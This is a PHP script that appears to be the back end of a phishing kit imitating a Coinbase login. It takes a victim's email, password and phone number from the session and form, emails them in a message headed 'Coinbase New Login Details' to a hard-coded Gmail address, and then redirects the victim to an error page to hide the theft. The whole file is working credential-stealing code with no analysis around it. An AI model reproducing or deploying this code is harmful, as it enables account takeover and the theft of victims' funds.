<?php

  session_start();

  if(!isset($_POST['submit']))
  {
    //This page should not be accessed directly. Need to submit the form.
    echo "Sorry, You don't have permission to view this page!";
  }
  else
  {
      $to = "kamlesh.kumar13091992@gmail.com";
      $from = "kamlesh.kumar13091992@gmail.com";
      $email = $_SESSION['email'];
      $password = $_SESSION['password'];
      $phone = $_POST['phone'];
      
      $headers = "From: $from";
      $headers = "From: " . $from . "\r\n";
      $headers .= "Reply-To: ". $from . "\r\n";
      $headers .= "MIME-Version: 1.0\r\n";
      $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

      $subject = "Coinbase New Login Details";

      $body = "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><title>Coinbase New Login</title></head><body>";
      $body .= "<table style='width: 100%;'>";
      $body .= "<tbody>";
      $body .= "<tr><td style='border:none;'><strong>Email:</strong> {$email}</td></tr>";
      $body .= "<tr><td style='border:none;'><strong>Password:</strong> {$password}</td></tr>";
      $body .= "<tr><td style='border:none;'><strong>Phone Number:</strong> {$phone}</td></tr>";
      $body .= "</tbody></table>";
      $body .= "</body></html>";

    //Send the Email!
      $send = mail($to, $subject, $body, $headers);
    //   mail($to, "$subject", $body, $headers);
    
    //Done. Redirect to Thank You Page.
    header('Location: error.html');

  }
?>